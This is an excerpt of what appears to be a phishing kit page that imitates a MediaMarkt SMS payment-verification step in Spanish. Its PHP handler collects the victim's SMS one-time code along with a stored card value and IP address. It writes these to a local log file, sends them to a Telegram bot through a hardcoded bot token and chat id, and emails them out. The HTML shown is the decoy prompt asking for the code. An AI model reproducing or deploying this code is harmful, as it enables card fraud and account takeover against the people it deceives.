...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (is_numeric($_POST['sms'])) {
		  ...
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            ...
            $message = "CC 2 :" . $_SESSION['cc2'] . "\nCodeSMS :" . $_POST['sms'] ."\n" . $ip . "\n*****************************\n";
            $file = fopen("./Corroes_sms.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$sms = $_POST['sms'];
$token = "1483651372:AAF-36a-HpIAFGbGl2sz0GmOC3uyW42vOW0";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-516299079&text=t=" . urlencode($message)."" );			$subject = "MediaMarketa_SMS : $ip ---> $sms";
			$headers = "From:SMS <>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
        header("Location: Seleccione_medio_de_pago_loading2.php?loading=".md5($_GET['error']));
                            ...
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div id="Panel1" class="ogilvy-subtitular">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">Verificación de SMS </span><br><span
                                                    id="conceptovalor" style="font-weight:normal;">Recibirá un código SMS para validar la operación, ingrese el código y presione validar . </span>
                                        </div>
                                    </div>
